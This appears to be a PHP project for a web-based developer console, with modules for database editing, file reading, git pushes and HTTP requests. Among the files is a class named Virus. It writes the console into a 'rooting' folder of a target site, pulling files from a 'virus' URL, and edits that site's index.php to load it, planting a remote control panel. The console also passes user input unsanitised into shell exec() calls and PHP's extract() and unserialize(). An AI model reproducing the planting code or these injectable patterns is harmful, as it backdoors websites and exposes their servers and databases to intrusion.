<?php

class console {

	/**
	 * @commandes Array
	 */
	private $commandes = [];

	/**
	 * @modules Array
	 */
	private $modules = [];

	/**
	 * @html String
	 */
	private $html;

	/**
	 * @res String
	 */
	private $res;

	/**
	 * @var String
	 */
	private $var;

	public function __Construct(String $comm, String $anc) {

		$path_html = new link('template/console.html');
		$html_tem = $path_html->get_link(1);

		$path_html = new link('template/console_init.html');
		$html_init = $path_html->get_link(1);

		$this->get_infs_modules();
		$this->init = file_get_contents($html_init);

		$path_env = new link('.env');
		$env = file($path_env->get_link(1));

		if ($comm == "init") {

			$this->html = file_get_contents($html_tem);
			
			$path = new link('js/console.js');
			$path_css = new link('css/style.css');

			$this->html = str_replace("{{link}}", $path->get_link(0), $this->html);
			$this->html = str_replace("{{link_css}}", $path_css->get_link(0), $this->html);
			$this->init = str_replace("{{header}}", $env[3], $this->init);
			$this->res = "";
		} else {

			$this->html = "{{infos}}";
			$single = explode(" ", $comm);
			$this->init = str_replace("{{header}}", $env[3], $this->init);
			$this->res = "<pre id='txt_console'>".$this->commande_exist($comm)."</pre>";
		}

		$this->replace_text($anc, $comm);
		$this->aff();
	}

	private function get_infs_modules() {

		$path = new link('.env_modules');
		$file = $path->get_link(1);
		$data = file($file);
		foreach ($data as $key => $value) {

			$tmp = unserialize($value);
			$this->commandes[] = $tmp[key($tmp)]['commandes'];
			$this->modules[] = key($tmp);
		}
	}

	private function aff() {

		echo $this->html;
	}

	private function replace_text(String $anc, String $comm) {

		if (empty($this->res))
			$this->html = str_replace("{{infos}}", $this->init, $this->html);
		else
			$this->html = str_replace("{{infos}}", $anc.$comm.$this->res.$this->init, $this->html);
	}

	private function commande_exist(String $comm) : String {

		$single = explode(" ", $comm);
		$separe = explode(".", $single[0]);

		if (!isset($separe[1]))
			return ($this->help(0, ""));

		if (!in_array($separe[0], $this->modules))
			return ($this->help(0, ""));

		if (!in_array($separe[1], $this->commandes[array_search($separe[0], $this->modules)]))
			return ($this->help(1, $separe[0]));

		if (!class_exists($separe[0]))
			return ("The Class ".$separe[0]." doesn't exist ...");

		$args = explode(" ", $comm);
		$commande = explode(".", $args[0]);
		unset($args[0]);

		$exec = new $separe[0]($commande[1], $this->return_arg(array_values($args)));

		if (!method_exists($exec, 'execute'))
			return ("The class ".$separe[0]." haven't an execute public function ...");

		return ($exec->execute());
	}

	private function return_arg(Array $tab) : Array {

		$i = 0;
		$argum = [];
		$in = 0;
		$c = "";
		while (isset($tab[$i])) {

			if ($in == 0) {

				if ($tab[$i][0] == "'" || $tab[$i][0] == '"') {

					$c = $tab[$i][0];
					if ($tab[$i][strlen($tab[$i]) - 1] == $c)
						$argum[] = str_replace($c, '', $tab[$i]);
					else {

						$str = $tab[$i];
						$in = 1;
					}
				}  else
					$argum[] = $tab[$i];
			} else {

				$str .= " ".$tab[$i];
				if ($tab[$i][strlen($tab[$i]) - 1] == $c) {
					$in = 0;
					$argum[] = str_replace($c, '', $str);
				}
			}
			$i++;
		}
		return ($argum);
	}

	private function help(Int $type, String $other) : String {

		$path = new link('template/help.txt');
		$file = $path->get_link(1);

		if ($type == 0)
			return (file_get_contents($file).$this->create_table($this->modules, ["Module(s) available", "Commande(s) available"], 0));

		return ($this->create_table($this->commandes[array_search($other, $this->modules)], "Commande(s) available for : ".$other, 1));
	}

	private function create_table(Array $elem, $header, Int $type) : String {

		$tbl = new createtab();

		if (is_array($header))
			$tbl->setHeaders($header);
		else
			$tbl->setHeaders([$header]);

		foreach ($elem as $key => $value) {
			if ($type == 0){
				$a = implode(", ", $this->commandes[array_search($value, $this->modules)]);
				$tbl->addRow([$value, $a]);
			}
			else
				$tbl->addRow([$value]);
		}
		return ($tbl->getTable());
	}
}

?>
<?php

Class init {


	/**
	 * @modules Array
	 */
	private $modules = [];

	/**
	 * @nb_modules Int
	 */
	private $nb_modules = 0;

	public function __Construct() {

		$this->get_modules();
		$this->compare_modules();
	}

	public function force() {
		
		$path = new link('.env_modules');
		$file = $path->get_link(1);
		$this->load_modules($file);
	}

	private function compare_modules() {

		$path = new link('.env_modules');
		$file = $path->get_link(1);
		if (count(file($file)) != $this->nb_modules)
			$this->load_modules($file);
	}

	private function load_modules(String $file) {

		file_put_contents($file, "");
		$i = 0;
		while (isset($this->modules[$i])) {
			file_put_contents($file, serialize($this->modules[$i])."\n", FILE_APPEND);
			$i++;
		}
	}

	private function get_modules() {

		$path = new link('modules/');
		$this->readdirectory($path->get_link(1));
	}

	private function readdirectory(String $directory) {

		$fileList = glob($directory."*.module.php");

		$path = new link('require/to_include.php');
		$file = $path->get_link(1);

		file_put_contents($file, "<?php\n");

		foreach($fileList as $filename) {

			$data = $this->infos_module($filename, $file);
   			$this->modules[][$data['name_module']] = $data['infos_module'];
   			$this->nb_modules++;
		}

		file_put_contents($file, "\n?>", FILE_APPEND);
	}

	private function infos_module(String $link_module, String $file) : Array {

		$data = [];
		$cut = explode("/", $link_module);
		$data['name_module'] = substr($cut[count($cut) - 1], 0, strpos($cut[count($cut) - 1], '.'));
		file_put_contents($file, "require '".$link_module."';\n", FILE_APPEND);
		$data['infos_module']['commandes'] = $this->get_module_commande($link_module);
		return ($data);
	}

	private function get_module_commande(String $link_module) : Array {

		$cat_file = file($link_module);
		$i = 0;
		while (isset($cat_file[$i])) {

			if (preg_match('#commandes = #', $cat_file[$i])) {

				preg_match_all('#(\[[^\]]*\])#', $cat_file[$i], $matches);
				$matches[0][0] = str_replace("[", "", $matches[0][0]);
				$matches[0][0] = str_replace("]", "", $matches[0][0]);
				$matches[0][0] = str_replace("'", "", $matches[0][0]);
				$matches[0][0] = str_replace('"', '', $matches[0][0]);
				$matches[0][0] = str_replace(' ', '', $matches[0][0]);
				return (explode(",", $matches[0][0]));
			}
			$i++;
		}
	}
}

?><?php

Class link {

	/**
	 * @file String
	 */
	private $file;

	/**
	 * @actual_url String
	 */
	private $actual_url;

	public function __Construct(String $link) {

		$this->file = $link;
		$this->actual_url = "http://{$_SERVER['HTTP_HOST']}";
	}

	private function get_console_dir() : String {

		$actual_path = getcwd();

		while (!file_exists($actual_path."/dev_console")) {
			
			$ex = explode("/", $actual_path);
			unset($ex[count($ex) - 1]);
			$actual_path = implode("/", $ex);
		}

		return ($actual_path."/dev_console");
	}

	public function get_link(Int $type) : String {

		$path = $this->get_console_dir()."/".$this->file;

		if ($type == 1)
			return ($path);

		$url_c = explode("/", $path);
		$doc_root = explode("/", $_SERVER['DOCUMENT_ROOT']);
		
		return ($this->actual_url."/".implode("/", array_diff($url_c, $doc_root)));
	}
}

?><?php

class createtab {
    
    const HEADER_INDEX = -1;
    const HR = 'HR';
    /** @var array Array of table data */
    protected $data = array();
    /** @var boolean Border shown or not */
    protected $border = true;
    /** @var boolean All borders shown or not */
    protected $allBorders = false;
    /** @var integer Table padding */
    protected $padding = 1;
    /** @var integer Table left margin */
    protected $indent = 0;
    /** @var integer */
    private $rowIndex = -1;
    /** @var array */
    private $columnWidths = array();
    /**
     * Adds a column to the table header
     * @param  mixed  Header cell content
     * @return object LucidFrame\Console\ConsoleTable
     */
    public function addHeader($content = '')
    {
        $this->data[self::HEADER_INDEX][] = $content;
        return $this;
    }
    /**
     * Set headers for the columns in one-line
     * @param  array  Array of header cell content
     * @return object LucidFrame\Console\ConsoleTable
     */
    public function setHeaders(array $content)
    {
        $this->data[self::HEADER_INDEX] = $content;
        return $this;
    }
    /**
     * Get the row of header
     */
    public function getHeaders()
    {
        return isset($this->data[self::HEADER_INDEX]) ? $this->data[self::HEADER_INDEX] : null;
    }
    /**
     * Adds a row to the table
     * @param  array  $data The row data to add
     * @return object LucidFrame\Console\ConsoleTable
     */
    public function addRow(array $data = null)
    {
        $this->rowIndex++;
        if (is_array($data)) {
            foreach ($data as $col => $content) {
                $this->data[$this->rowIndex][$col] = $content;
            }
        }
        return $this;
    }
    /**
     * Adds a column to the table
     * @param  mixed    $content The data of the column
     * @param  integer  $col     The column index to populate
     * @param  integer  $row     If starting row is not zero, specify it here
     * @return object LucidFrame\Console\ConsoleTable
     */
    public function addColumn($content, $col = null, $row = null)
    {
        $row = $row === null ? $this->rowIndex : $row;
        if ($col === null) {
            $col = isset($this->data[$row]) ? count($this->data[$row]) : 0;
        }
        $this->data[$row][$col] = $content;
        return $this;
    }
    /**
     * Show table border
     * @return object LucidFrame\Console\ConsoleTable
     */
    public function showBorder()
    {
        $this->border = true;
        return $this;
    }
    /**
     * Hide table border
     * @return object LucidFrame\Console\ConsoleTable
     */
    public function hideBorder()
    {
        $this->border = false;
        return $this;
    }
    /**
     * Show all table borders
     * @return object LucidFrame\Console\ConsoleTable
     */
    public function showAllBorders()
    {
        $this->showBorder();
        $this->allBorders = true;
        return $this;
    }
    /**
     * Set padding for each cell
     * @param  integer $value The integer value, defaults to 1
     * @return object LucidFrame\Console\ConsoleTable
     */
    public function setPadding($value = 1)
    {
        $this->padding = $value;
        return $this;
    }
    /**
     * Set left indentation for the table
     * @param  integer $value The integer value, defaults to 1
     * @return object LucidFrame\Console\ConsoleTable
     */
    public function setIndent($value = 0)
    {
        $this->indent = $value;
        return $this;
    }
    /**
     * Add horizontal border line
     * @return object LucidFrame\Console\ConsoleTable
     */
    public function addBorderLine()
    {
        $this->rowIndex++;
        $this->data[$this->rowIndex] = self::HR;
        return $this;
    }
    /**
     * Print the table
     * @return void
     */
    public function display()
    {
        echo $this->getTable();
    }
    /**
     * Get the printable table content
     * @return string
     */
    public function getTable()
    {
        $this->calculateColumnWidth();
        $output = $this->border ? $this->getBorderLine() : '';
        foreach ($this->data as $y => $row) {
            if ($row === self::HR) {
                if (!$this->allBorders) {
                    $output .= $this->getBorderLine();
                    unset($this->data[$y]);
                }
                continue;
            }
            foreach ($row as $x => $cell) {
                $output .= $this->getCellOutput($x, $row);
            }
            $output .= PHP_EOL;
            if ($y === self::HEADER_INDEX) {
                $output .= $this->getBorderLine();
            } else {
                if ($this->allBorders) {
                    $output .= $this->getBorderLine();
                }
            }
        }
        if (!$this->allBorders) {
            $output .= $this->border ? $this->getBorderLine() : '';
        }
        if (PHP_SAPI !== 'cli') {
            $output = '<pre id="txt_console">'.$output.'</pre>';
        }
        return $output;
    }
    /**
     * Get the printable border line
     * @return string
     */
    private function getBorderLine()
    {
        $output = '';
        if (isset($this->data[0])) {
            $columnCount = count($this->data[0]);
        } elseif (isset($this->data[self::HEADER_INDEX])) {
            $columnCount = count($this->data[self::HEADER_INDEX]);
        } else {
            return $output;
        }
        for ($col = 0; $col < $columnCount; $col++) {
            $output .= $this->getCellOutput($col);
        }
        if ($this->border) {
            $output .= '+';
        }
        $output .= PHP_EOL;
        return $output;
    }
    /**
     * Get the printable cell content
     *
     * @param integer $index The column index
     * @param array   $row   The table row
     * @return string
     */
    private function getCellOutput($index, $row = null)
    {
        $cell       = $row ? $row[$index] : '-';
        $width      = $this->columnWidths[$index];
        $pad        = $row ? $width - mb_strlen($cell, 'UTF-8') : $width;
        $padding    = str_repeat($row ? ' ' : '-', $this->padding);
        $output = '';
        if ($index === 0) {
            $output .= str_repeat(' ', $this->indent);
        }
        if ($this->border) {
            $output .= $row ? '|' : '+';
        }
        $output .= $padding; # left padding
        $cell    = trim(preg_replace('/\s+/', ' ', $cell)); # remove line breaks
        $content = preg_replace('#\x1b[[][^A-Za-z]*[A-Za-z]#', '', $cell);
        $delta   = mb_strlen($cell, 'UTF-8') - mb_strlen($content, 'UTF-8');
        $output .= $this->strPadUnicode($cell, $width + $delta, $row ? ' ' : '-'); # cell content
        $output .= $padding; # right padding
        if ($row && $index == count($row) - 1 && $this->border) {
            $output .= $row ? '|' : '+';
        }
        return $output;
    }
    /**
     * Calculate maximum width of each column
     * @return array
     */
    private function calculateColumnWidth()
    {
        foreach ($this->data as $y => $row) {
            if (is_array($row)) {
                foreach ($row as $x => $col) {
                    $content = preg_replace('#\x1b[[][^A-Za-z]*[A-Za-z]#', '', $col);
                    if (!isset($this->columnWidths[$x])) {
                        $this->columnWidths[$x] = mb_strlen($content, 'UTF-8');
                    } else {
                        if (mb_strlen($content, 'UTF-8') > $this->columnWidths[$x]) {
                            $this->columnWidths[$x] = mb_strlen($content, 'UTF-8');
                        }
                    }
                }
            }
        }
        return $this->columnWidths;
    }
    /**
     * Multibyte version of str_pad() function
     * @source http://php.net/manual/en/function.str-pad.php
     */
    private function strPadUnicode($str, $padLength, $padString = ' ', $dir = STR_PAD_RIGHT)
    {
        $strLen     = mb_strlen($str, 'UTF-8');
        $padStrLen  = mb_strlen($padString, 'UTF-8');
        if (!$strLen && ($dir == STR_PAD_RIGHT || $dir == STR_PAD_LEFT)) {
            $strLen = 1;
        }
        if (!$padLength || !$padStrLen || $padLength <= $strLen) {
            return $str;
        }
        $result = null;
        $repeat = ceil($strLen - $padStrLen + $padLength);
        if ($dir == STR_PAD_RIGHT) {
            $result = $str . str_repeat($padString, $repeat);
            $result = mb_substr($result, 0, $padLength, 'UTF-8');
        } elseif ($dir == STR_PAD_LEFT) {
            $result = str_repeat($padString, $repeat) . $str;
            $result = mb_substr($result, -$padLength, null, 'UTF-8');
        } elseif ($dir == STR_PAD_BOTH) {
            $length = ($padLength - $strLen) / 2;
            $repeat = ceil($length / $padStrLen);
            $result = mb_substr(str_repeat($padString, $repeat), 0, floor($length), 'UTF-8')
                . $str
                . mb_substr(str_repeat($padString, $repeat), 0, ceil($length), 'UTF-8');
        }
        return $result;
    }
}

?><?php

require 'class/tab.class.php';
require 'class/link.class.php';
require 'class/console.class.php';
require 'class/init.class.php';

extract($_POST);

$js_path = new link('console.php');
$js_p = $js_path->get_link(0);
?>
<script type="text/javascript">
var link = "<?= $js_p; ?>";
</script>
<?php

$aff = "";

if (isset($anc))
	$aff = $anc;

$init = new init();
require 'require/to_include.php';

if (isset($commande))
	$console = new console($commande, $aff);
else
	$console = new console("init", $aff);
?>
<?php

$data = new Virus();
//$data->infect_structure_dir();
//$data->infect_structure_file();
//$data->infect_index_php();
$data->infect_database();

Class Virus {

	/**
	 * @link_index String
	 */
	private $link_index;

	/**
	 * @link_root String
	 */
	private $link_root;

	/**
	 * @struct_dir Array
	 */
	private $struct_dir = ["class", "css", "js", "modules", "require", "template"];

	/**
	 * @struct_file Array
	 */
	private $struct_file = [

		"class" => ["console.class.phps", "init.class.phps", "link.class.phps", "tab.class.phps"],
		"css" => ["style.css"],
		"js" => ["console.js"],
		"modules" => [],
		"require" => ["to_include.phps"],
		"template" => ["console.html", "console_init.html", "help.txt", "module_type.txt"],
		"racine" => [".env", ".env_modules", "console.phps"]

	];

	const DIR_VIRUS = "rooting";
	const URL_SITE = "http://localhost/virus/";

	public function __Construct() {

		$link_explode = explode('/', $_SERVER['HTTP_REFERER']);
		$this->link_index = $_SERVER['DOCUMENT_ROOT'].'/'.$link_explode[count($link_explode) - 2].'/index.php';
		$this->link_root = $_SERVER['DOCUMENT_ROOT'].'/'.$link_explode[count($link_explode) - 2].'/';
	}

	public function infect_structure_dir() {

		exec("ls -l ".$this->link_root.self::DIR_VIRUS, $exist_directory);

		if (empty($exist_directory)) {

			exec("mkdir ".$this->link_root.self::DIR_VIRUS);

			foreach ($this->struct_dir as $value) {

				exec("mkdir ".$this->link_root.self::DIR_VIRUS.'/'.$value);
			}
		}
	}

	public function infect_structure_file() {

		foreach ($this->struct_dir as $dir) {
			
			foreach ($this->struct_file[$dir] as $file) {

				$file_info = pathinfo(self::URL_SITE.$dir.'/'.$file);
				
				if ($file_info['extension'] != 'phps')
					file_put_contents($this->link_root.self::DIR_VIRUS.'/'.$dir.'/'.$file, file_get_contents(self::URL_SITE.$dir.'/'.$file));
				else
					file_put_contents($this->link_root.self::DIR_VIRUS.'/'.$dir.'/'.str_replace('phps', 'php', $file), file_get_contents(self::URL_SITE.$dir.'/'.$file));
			}
		}

		foreach ($this->struct_file["racine"] as $file) {
				
			$file_info = pathinfo(self::URL_SITE.$dir.'/'.$file);
				
			if ($file_info['extension'] != 'phps')
				file_put_contents($this->link_root.self::DIR_VIRUS.'/'.$file, file_get_contents(self::URL_SITE.$file));
			else
				file_put_contents($this->link_root.self::DIR_VIRUS.'/'.str_replace('phps', 'php', $file), file_get_contents(self::URL_SITE.$file));
		}
	}

	public function infect_index_php() {

		exec("ls -l ".$this->link_index, $is);

		if (empty($is))
			file_put_contents($this->link_index, "");

		$ligne_php = "require 'rooting/console.php';\n";

		$index_content = file($this->link_index);
		$index_content[1] = $index_content[1]."\n".$ligne_php;
		file_put_contents($this->link_index, implode("", $index_content));
	}

	public function infect_database() {

		
	}
}
?><?php

Class bdd {


	/**
	 * @args Array
	 */
	private $args = [];

	/**
	 * @comm String
	 */
	private $comm;

	/**
	 * @bdd Object
	 */
	private $bdd;

	/**
	 * @tables Array
	 */
	private $tables = [];

	/**
	 * @commandes Array
	 */
	private $commandes = ["insert", "update", "delete", "show_table", "get"];

	public function __Construct(String $commande, Array $arguments) {

		$this->args = $arguments;
		$this->comm = $commande;

		$path = new link('.env');
		$data = file($path->get_link(1));

		if (!isset($data[2]))
			$data[2] = "";

		$data[1] = str_replace("\n", "", $data[1]);
		$data[2] = str_replace("\n", "", $data[2]);
		$data[3] = str_replace("\n", "", $data[3]);

		$this->bdd = new PDO(str_replace("\n", "", $data[0]), str_replace("\n", "", $data[1]), $data[2]);

		$req_table = $this->bdd->query("SHOW TABLES");
		$res = $req_table->fetchAll();
		$this->tables = [];

		$i = 0;
		while (isset($res[$i])) {
			$this->tables[] = $res[$i][0];
			$i++;
		}
	}

	public function execute_req($tab, $req) : String {

		if (!in_array($this->args[0], $this->tables))
			return ("Table ".$this->args[0]." doesn't exist ");

		$exec = $this->bdd->query($req);
		$exec = $exec->fetchAll();

		$get_infs = $this->bdd->query('DESCRIBE '.$this->args[0]);
		$colum = $get_infs->fetchAll();
		
		return ($this->create_table($this->get_just_val($colum, 'Field'), $this->get_just_val($exec, ["int"]), 0));
	}

	private function show_table() : String {

		return ($this->create_table("Database table(s)", $this->tables, 0));
	}

	private function get() : String {

		if (!isset($this->args[0]))
			return ("Usage : bdd.get [table to get data]");

		if (!in_array($this->args[0], $this->tables))
			return ("Table ".$this->args[0]." doesn't exist ");

		$get_infs = $this->bdd->query('DESCRIBE '.$this->args[0]);
		$colum = $get_infs->fetchAll();

		$get_infs = $this->bdd->query('SELECT * FROM '.$this->args[0]);
		$tab_infs = $get_infs->fetchAll();

		return ($this->create_table($this->get_just_val($colum, 'Field'), $this->get_just_val($tab_infs, ["int"]), 0));
	}

	private function insert() : String {

		if (!isset($this->args[0]))
			return ("Usage : bdd.insert [table to insert data] [value for each colum (ex : 'arthur, gasparotto, 19 ...') ]");

		if (!in_array($this->args[0], $this->tables))
			return ("Table ".$this->args[0]." doesn't exist ");

		$get_infs = $this->bdd->query('DESCRIBE '.$this->args[0]);
		$colum = $get_infs->fetchAll();

		$cols = $this->get_just_val($colum, 'Field');
		unset($cols[0]);
		$cols = array_values($cols);

		if (count($this->args) != (count($cols) + 1))
			return ("The number of values doesn't match with the number of colum (".(count($this->args) - 1)." value(s) for ".count($cols)." colum(s)) Colum to fill : ".implode(", ", $cols));

		$vals = "(".implode(", ", $cols).")";
		$c = count($cols);
		$values_in = "(";
		while ($c > 0) {
			$values_in .= "?, ";
			$c--;
		}

		$values_in = substr($values_in, 0, -2).')';


		$insert_data = $this->bdd->prepare("INSERT INTO ".$this->args[0].$vals." VALUES".$values_in);
		unset($this->args[0]);

		$this->args = array_values($this->args);

		$insert_data->execute($this->args);

		if ($insert_data->rowCount() > 0)
			return ("data fill success");
		return ("Error : data fill fail (maybe check the type of colum)");
	}

	private function update() : String {

		if (!isset($this->args[0]) || !isset($this->args[1]) || !isset($this->args[2]))
			return ("Usage : bdd.update [table to insert data] [data to change ex('nom:gasparotto, prenom:arthur')] [condition ex('id:3')]");

		if (!in_array($this->args[0], $this->tables))
			return ("Table ".$this->args[0]." doesn't exist ");

		$this->args[1] = str_replace(" ", "", $this->args[1]);
		$this->args[2] = str_replace(" ", "", $this->args[2]);

		$tab_up = explode(",", $this->args[1]);
		$tab_where = explode(",", $this->args[2]);

		if (($is_ok = $this->is_a_colum($tab_up)) != 1)
			return ($is_ok);

		if (($is_ok = $this->is_a_colum($tab_where)) != 1)
			return ($is_ok);

		return ($this->update_bdd($tab_up, $tab_where));

	}

	private function delete() : String {

		if (!isset($this->args[0]) || !isset($this->args[1]))
			return ("Usage : bdd.delete [table to insert data] [condition ex('id:3')]");

		if (!in_array($this->args[0], $this->tables))
			return ("Table ".$this->args[0]." doesn't exist ");

		$this->args[1] = str_replace(" ", "", $this->args[1]);
		$tab_where = explode(",", $this->args[1]);

		if (($is_ok = $this->is_a_colum($tab_where)) != 1)
			return ($is_ok);

		$values = [];
		$str = "DELETE FROM ".$this->args[0]." WHERE ";

		$i = 0;
		while (isset($tab_where[$i])) {

			$exp = explode(":", $tab_where[$i]);
			$values[] = $exp[1];
			if (isset($tab_where[$i + 1]))
				$str .= $exp[0]." = ? AND ";
			else
				$str .= $exp[0]." = ?";
			$i++;
		}

		$del = $this->bdd->prepare($str);
		$del->execute($values);

		if ($del->rowCount() > 0)
			return ("data delete success");
		return ("Error : data delete fail");

	}

	private function update_bdd($update, $cond) : String {

		$values = [];

		$str = "UPDATE ".$this->args[0]." SET ";

		$i = 0;
		while (isset($update[$i])) {

			$exp = explode(":", $update[$i]);
			$values[] = $exp[1];
			if (isset($update[$i + 1]))
				$str .= $exp[0]." = ?, ";
			else
				$str .= $exp[0]." = ? ";
			$i++;
		}

		$str .= "WHERE ";

		$i = 0;
		while (isset($cond[$i])) {

			$exp = explode(":", $cond[$i]);
			$values[] = $exp[1];
			if (isset($cond[$i + 1]))
				$str .= $exp[0]." = ? AND ";
			else
				$str .= $exp[0]." = ?";
			$i++;
		}

		$up = $this->bdd->prepare($str);
		$up->execute($values);

		if ($up->rowCount() > 0)
			return ("data update success");
		return ("Error : data update fail");
	}

	private function is_a_colum($tab) {

		$get_infs = $this->bdd->query('DESCRIBE '.$this->args[0]);
		$colum = $get_infs->fetchAll();
		$cols = $this->get_just_val($colum, 'Field');

		$i = 0;
		while (isset($tab[$i])) {

			$exp = explode(":", $tab[$i]);
			if (!in_array($exp[0], $cols))
				return ("The colum ".$exp[0]." doesn't exist in table ".$this->args[0]);
			$i++;
		}
		return (1);
	}

	private function get_just_val($tab, $champs) : Array {

		$i = 0;
		$col = [];

		while (isset($tab[$i])) {

			if (is_array($champs)) {
				foreach ($tab[$i] as $key => $value) {
					if ($champs[0] == "int") {
						if (is_numeric($key))
							$col[$i][] = $value;
					}
				}
			} else
				$col[] = $tab[$i][$champs];
			$i++;
		}
		return ($col);
	}

	private function create_table($header, $values, $type) : String {

		$tbl = new createtab();

		if (is_array($header))
			$tbl->setHeaders($header);
		else
			$tbl->setHeaders([$header]);

		$i = 0;
		if (!is_array($values[$i])) {

			foreach ($values as $value) {
				$tbl->addRow([$value]);
			}

			return ($tbl->getTable());
		}

		while (isset($values[$i])) {

			$tbl->addRow($values[$i]);
			$i++;
		}

		return ($tbl->getTable());
	}

	public function execute() : String {
		
		return ($this->{$this->comm}());
	}
}

?><?php

Class change_header {


	/**
	 * @args Array
	 */
	private $args = [];

	/**
	 * @comm String
	 */
	private $comm;

	/**
	 * @commandes Array
	 */
	private $commandes = ["change"];

	public function __Construct(String $commande, Array $arguments) {

		$this->args = $arguments;
		$this->comm = $commande;
	}

	private function change() : String {

		if (isset($this->args[0])) {

			$path_env = new link('.env');
			$env = file($path_env->get_link(1));
			$env[3] = $this->args[0]."\n";
			file_put_contents($path_env->get_link(1), implode("", $env));
			return ("Header change : success (haeder change for the next commandes)");
		}
		return ("Usage : change_header.change ['new header']");
	}

	public function execute() : String {

		return ($this->{$this->comm}());
	}
}

?><?php

Class file {

	/**
	 * @comm String
	 */
	private $comm;

	/**
	 * @commandes Array
	 */
	private $commandes = ["structure", "show"];

	/**
	 * @args Array
	 */
	private $args = [];

	public function __Construct(String $commande, Array $arguments) {

		$this->args = $arguments;
		$this->comm = $commande;
	}

	private function structure() : String {

		if (!isset($this->args[0]))
			return ("Usage : file.structure [ path ]");

		if ($this->args[0][strlen($this->args[0]) - 1] != "/")
			$this->args[0] .= "/";

		$path_file = $this->search_path();
		if (!file_exists($path_file))
			return ($path_file);

		exec("ls -R ".$path_file."*", $rep);

		$i = 0;
		$str = "";
		while (isset($rep[$i])) {

			if (!empty($rep[$i])) {

				if ($rep[$i][strlen($rep[$i]) - 1] == ":")
					$str .= "<br>".$rep[$i]."<br>";
				else if (empty($rep[$i]))
					$str .= "<br>";
				else
					$str .= $rep[$i]." ";
			} else
				$str .= "<br>";

			$i++;
		}

		return ($str);
	}

	private function search_path() : String {

		$try = 0;

		$actual_path = getcwd().'/'.$this->args[0];
		while (!file_exists($actual_path)) {

			if ($try > 10)
				return ("error : Directory can't be found");
			
			$ex_path = explode('/', $actual_path);
			unset($ex_path[4]);
			$actual_path = implode('/', $ex_path);
			$try++;
		}


		return ($actual_path);
	}

	private function show() : String {

		if (!isset($this->args[0]))
			return ("Usage : file.show [file to read]");

		if (!file_exists($this->args[0]))
			return ("The file : ".$this->args[0]." doesn't exist");

		$path_env = new link($this->args[0]);
		$env = str_replace("<?php", "", file_get_contents($path_env->get_link(1)));

		return ($env);
	}

	public function execute() : String {

		return ($this->{$this->comm}());
	}
}

?><?php

Class git {

	/**
	 * @comm String
	 */
	private $comm;

	/**
	 * @commandes Array
	 */
	private $commandes = ["push", "set_commit_name", "get_commit_name"];

	/**
	 * @args Array
	 */
	private $args = [];

	public function __Construct(String $commande, Array $arguments) {

		$this->args = $arguments;
		$this->comm = $commande;
	}

	private function set_commit_name() : String {

		if (!isset($this->args[0]))
			return ("Usage : git.set_commit_name ['new name']");

		$path_env = new link('.env');
		$env = file($path_env->get_link(1));

		if (isset($env[4]))
			$env[4] = $this->args[0];
		else
			$env[4] = "\n".$this->args[0];
		file_put_contents($path_env->get_link(1), implode("", $env));

		return ("Commit name change success");
	}

	private function get_commit_name() : String {

		$path_env = new link('.env');
		$env = file($path_env->get_link(1));

		if (isset($env[4]))
			return ("Commit name : ".$env[4]);
		
		return ("No Commit name set");
	}

	private function push() : String {

		if (!isset($this->args[0]))
			return ("Usage : git.push [path to directory] for you maybe : ".$this->link_proj()." (current project)");

		$path_env = new link('.env');
		$env = file($path_env->get_link(1));

		if (!file_exists($this->args[0]))
			return ("The file : ".$this->args[0]." doesn't exist, you would say : ".$this->link_proj()." ? (current project)");

		exec("cd ".$this->args[0]." && git add .", $add);
		exec("cd ".$this->args[0]." && git commit -m '".$env[4]."'", $commit);
		exec("cd ".$this->args[0]." && git push", $push);

		return (implode("\n", $add).implode("\n", $commit).implode("\n", $push));

	}

	private function link_proj() : String {

		$serv = explode("/", str_replace($_SERVER['HTTP_ORIGIN'], '', $_SERVER['HTTP_REFERER']));
		return ($_SERVER['DOCUMENT_ROOT']."/".$serv[1]);
	}

	public function execute() : String {

		return ($this->{$this->comm}());
	}
}

?><?php
class http_request {

	/**
	 * @comm String
	 */
	private $comm;

	/**
	 * @commandes Array
	 */
	private $commandes = ["request"];

	/**
	 * @args Array
	 */
	private $args = [];

	/**
	 * @methode String
	 */
	private $methode;

	/**
	 * @url String
	 */
	private $url;

	public function __Construct(String $commande, Array $arguments) {

		$this->args = $arguments;
		$this->comm = $commande;
	}

	private function send_request() : String {

		if ($this->methode != 'GET') {

			$postdata = http_build_query(
				$this->args
			);

			$opts = array('http' =>
			    array(
			        'method'  => $this->methode,
			        'header'  => 'Content-Type: application/x-www-form-urlencoded',
			        'content' => $postdata
			    )
			);

			$context  = stream_context_create($opts);
			$result = file_get_contents($this->url, false, $context);

		} else {

			$parametres = "";
			foreach ($this->args as $key => $value) {

				$parametres .= $key.'='.urlencode($value)."&";	
			}

			$parametres = substr($parametres, 0,  -1);
			$result = file_get_contents($this->url.'?'.$parametres);
		}

		return ($result);
	}

	private function request() : String {

		if (isset($this->args[0]) && isset($this->args[1])) {

			$this->methode = strtoupper($this->args[0]);
			$this->url = $this->args[1];
			$this->args = $this->create_table();

			return ($this->send_request());
		}

		return ("Usage : http_request.new [methode (POST, GET ...) ] [url] ['pass:hello, value:ok ...']");
	}

	private function create_table() : Array {

		if (!isset($this->args[2]))
			return ([]);

		$this->args[2] = str_replace(" ", "", $this->args[2]);
		$this->args[2] = str_replace("'", "", $this->args[2]);
		$this->args[2] = str_replace('"', '', $this->args[2]);

		$tab = explode(",", $this->args[2]);
		$final = [];

		$i = 0;
		while (isset($tab[$i])) {

			$ex = explode(":", $tab[$i]);
			if (isset($ex[1]))
				$final[$ex[0]] = $ex[1];
			$i++;
		}

		return ($final);
	}

	public function execute() : String {

		return ($this->{$this->comm}());
	}
}

?><?php

Class stats {

	/**
	 * @comm String
	 */
	private $comm;

	/**
	 * @commandes Array
	 */
	private $commandes = ["most", "less"];

	/**
	 * @args Array
	 */
	private $args = [];

	public function __Construct(String $commande, Array $arguments) {

		$this->args = $arguments;
		$this->comm = $commande;
	}

	private function check_require() {

		$path_re = new link('.env_modules');
		$data = file($path_re->get_link(1));
		foreach ($data as $value) {
			$value = unserialize($value);
			if (key($value) == "bdd")
				return (1);
		}
		return ("You must have the bdd module to run this module");
	}

	private function most() : String {

		if (!isset($this->args[0]) || !isset($this->args[1]))
			return ("Usage : stats.most [table] [colum (value of this colum must be : int)]");

		$req = "SELECT * FROM ".$this->args[0]." ORDER BY ".$this->args[1]." DESC";
		$get_bdd = new bdd($this->comm, $this->args);
		return ($get_bdd->execute_req($this->args[0], $req));
	}

	private function less() : String {

		if (!isset($this->args[0]) || !isset($this->args[1]))
			return ("Usage : stats.less [table] [colum (value of this colum must be : int)]");

		$req = "SELECT * FROM ".$this->args[0]." ORDER BY ".$this->args[1]." ASC";
